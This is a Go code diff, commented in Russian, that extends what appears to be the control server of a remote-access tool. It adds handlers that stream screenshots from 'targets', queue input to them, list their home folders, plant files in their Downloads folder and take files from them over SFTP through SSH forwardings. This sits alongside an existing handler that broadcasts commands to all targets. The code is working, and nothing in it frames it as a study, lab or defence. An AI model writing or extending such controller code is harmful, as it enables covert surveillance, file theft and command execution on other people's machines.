@@ -21,7 +21,8 @@ import (
 	"sync"
 	"time"
 
-	"golang.org/x/crypto/ssh"
+	sftp "github.com/pkg/sftp"
+	ssh "golang.org/x/crypto/ssh"
 )
 
 const (
@@ -39,6 +40,7 @@ var (
 var (
 	hbMu    sync.Mutex
 	hbCount int
+	inputQ  = map[int][]string{}
 )
 
 func valid(line string) bool {
@@ -113,6 +115,246 @@ func inventoryHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	w.Header().Set("Content-Type", "application/json; charset=utf-8")
 	w.Write(out)
+}
+
+// кадры экрана: последний кадр на порт + очередь ввода + флаг зрителя
+type screenFrame struct {
+	jpg  []byte
+	w, h int
+	ts   int64
+}
+
+var (
+	screenMu     sync.Mutex
+	screenFrames = map[int]screenFrame{}
+	inputQueues  = map[int][]string{}
+	lastViewer   = map[int]int64{}
+)
+
+func screenHandler(w http.ResponseWriter, r *http.Request) {
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	screenMu.Lock()
+	defer screenMu.Unlock()
+	if r.Method == "GET" {
+		lastViewer[port] = time.Now().Unix()
+	}
+	if r.Method == "POST" {
+		body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 3<<20))
+		if err != nil || len(body) < 100 {
+			http.Error(w, "bad frame", 400)
+			return
+		}
+		fw, _ := strconv.Atoi(r.URL.Query().Get("w"))
+		fh, _ := strconv.Atoi(r.URL.Query().Get("h"))
+		screenFrames[port] = screenFrame{jpg: body, w: fw, h: fh, ts: time.Now().Unix()}
+		fmt.Fprint(w, "ok")
+		return
+	}
+	fr, ok := screenFrames[port]
+	if !ok || time.Now().Unix()-fr.ts > 60 {
+		http.Error(w, "no frame", 404)
+		return
+	}
+	w2 := w.Header()
+	w2.Set("Content-Type", "image/jpeg")
+	w2.Set("X-Frame-W", strconv.Itoa(fr.w))
+	w2.Set("X-Frame-H", strconv.Itoa(fr.h))
+	w.Write(fr.jpg)
+}
+
+func inputHandler(w http.ResponseWriter, r *http.Request) {
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	screenMu.Lock()
+	defer screenMu.Unlock()
+	if r.Method == "GET" {
+		lastViewer[port] = time.Now().Unix()
+	}
+	if r.Method == "POST" {
+		body, _ := io.ReadAll(http.MaxBytesReader(w, r.Body, 8192))
+		line := strings.TrimSpace(string(body))
+		if line != "" {
+			inputQ[port] = append(inputQ[port], line)
+		}
+		fmt.Fprint(w, "ok")
+		return
+	}
+	lines := inputQ[port]
+	delete(inputQ, port)
+	fmt.Fprint(w, strings.Join(lines, "\n"))
+}
+
+func viewerHandler(w http.ResponseWriter, r *http.Request) {
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	screenMu.Lock()
+	defer screenMu.Unlock()
+	// bootstrap: кадра ещё нет — зритель считается активным (первый кадр)
+	if _, ok := screenFrames[port]; !ok {
+		fmt.Fprint(w, "yes")
+		return
+	}
+	if time.Now().Unix()-lastViewer[port] < 5 {
+		fmt.Fprint(w, "yes")
+		return
+	}
+	fmt.Fprint(w, "no")
+}
+
+// sftpFor: SFTP-клиент цели (пути относительно домашней папки пользователя).
+func sftpFor(port int) (*sftp.Client, func(), error) {
+	addr := fmt.Sprintf("127.0.0.1:%d", port)
+	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+	if err != nil {
+		return nil, nil, err
+	}
+	cc, chans, reqs, err := ssh.NewClientConn(conn, addr, &ssh.ClientConfig{
+		User:              "anyuser",
+		Auth:              []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
+		HostKeyCallback:   ssh.FixedHostKey(clientHostPub),
+		HostKeyAlgorithms: []string{ssh.KeyAlgoED25519},
+		Timeout:           5 * time.Second,
+	})
+	if err != nil {
+		conn.Close()
+		return nil, nil, err
+	}
+	client := ssh.NewClient(cc, chans, reqs)
+	sc, err := sftp.NewClient(client)
+	if err != nil {
+		client.Close()
+		return nil, nil, err
+	}
+	cleanup := func() { sc.Close(); client.Close() }
+	return sc, cleanup, nil
+}
+
+func safeName(name string) string {
+	name = filepath.Base(strings.ReplaceAll(name, "\\", "/"))
+	name = strings.Map(func(r rune) rune {
+		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || strings.ContainsRune(".-_ ()", r) {
+			return r
+		}
+		return '_'
+	}, name)
+	if name == "" || name == "." || name == ".." {
+		return ""
+	}
+	return name
+}
+
+// lsHandler: список файлов домашней папки цели.
+func lsHandler(w http.ResponseWriter, r *http.Request) {
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	sc, cleanup, err := sftpFor(port)
+	if err != nil {
+		http.Error(w, err.Error(), 502)
+		return
+	}
+	defer cleanup()
+	infos, err := sc.ReadDir(".")
+	if err != nil {
+		http.Error(w, err.Error(), 502)
+		return
+	}
+	type fi struct {
+		Name string `json:"n"`
+		Size int64  `json:"s"`
+		Dir  bool   `json:"d"`
+	}
+	var out []fi
+	for _, i := range infos {
+		out = append(out, fi{Name: i.Name(), Size: i.Size(), Dir: i.IsDir()})
+	}
+	w.Header().Set("Content-Type", "application/json")
+	_ = json.NewEncoder(w).Encode(out)
+}
+
+// putFileHandler: приём файла (тело запроса) → Downloads цели.
+func putFileHandler(w http.ResponseWriter, r *http.Request) {
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	name := safeName(r.URL.Query().Get("name"))
+	if name == "" {
+		http.Error(w, "bad name", 400)
+		return
+	}
+	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 512<<20))
+	if err != nil || len(body) == 0 {
+		http.Error(w, "empty body", 400)
+		return
+	}
+	sc, cleanup, err := sftpFor(port)
+	if err != nil {
+		http.Error(w, err.Error(), 502)
+		return
+	}
+	defer cleanup()
+	f, err := sc.Create("Downloads/" + name)
+	if err != nil {
+		http.Error(w, err.Error(), 502)
+		return
+	}
+	if _, err := f.Write(body); err != nil {
+		f.Close()
+		http.Error(w, err.Error(), 502)
+		return
+	}
+	f.Close()
+	fmt.Fprint(w, "ok")
+}
+
+// getFileHandler: отдача файла из домашней папки или Downloads цели.
+func getFileHandler(w http.ResponseWriter, r *http.Request) {
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	name := safeName(r.URL.Query().Get("name"))
+	if name == "" {
+		http.Error(w, "bad name", 400)
+		return
+	}
+	sc, cleanup, err := sftpFor(port)
+	if err != nil {
+		http.Error(w, err.Error(), 502)
+		return
+	}
+	defer cleanup()
+	f, err := sc.Open(name)
+	if err != nil {
+		f, err = sc.Open("Downloads/" + name)
+		if err != nil {
+			http.Error(w, "not found", 404)
+			return
+		}
+	}
+	defer f.Close()
+	fi, _ := f.Stat()
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", "attachment; filename=\""+name+"\"")
+	if fi != nil {
+		w.Header().Set("Content-Length", strconv.FormatInt(fi.Size(), 10))
+	}
+	io.Copy(w, f)
 }
 
 // broadcastHandler: параллельный exec на целях через их форвардинги.
@@ -282,10 +524,16 @@ func main() {
 		clientHostPub = hp
 	}
 
-	// broadcast exec + inventory: HTTP на отдельном порту (только localhost)
+	// broadcast exec + inventory + screen: HTTP на отдельном порту (localhost)
 	go func() {
 		http.HandleFunc("/broadcast", broadcastHandler)
 		http.HandleFunc("/inventory", inventoryHandler)
+		http.HandleFunc("/ls", lsHandler)
+		http.HandleFunc("/putfile", putFileHandler)
+		http.HandleFunc("/getfile", getFileHandler)
+		http.HandleFunc("/screen", screenHandler)
+		http.HandleFunc("/input", inputHandler)
+		http.HandleFunc("/viewer", viewerHandler)
 		log.Fatal(http.ListenAndServe("127.0.0.1:8897", nil))
 	}()
 
